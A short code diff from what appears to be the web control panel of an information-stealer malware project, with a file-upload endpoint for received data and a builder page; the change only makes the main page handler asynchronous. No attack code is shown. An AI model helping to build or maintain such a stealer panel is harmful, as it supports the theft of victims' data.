@@ -130,10 +130,10 @@ async def receive_data(request: Request, file: UploadFile = File(...)) -> JSONRe
 
 
 @ui.page("/")
-def main_page() -> None:
+async def main_page() -> None:
     """Main page for the stealer. Very simple."""
     with frame(True):
-        fr_page()
+        await fr_page()
 
 
 @ui.page("/builder")
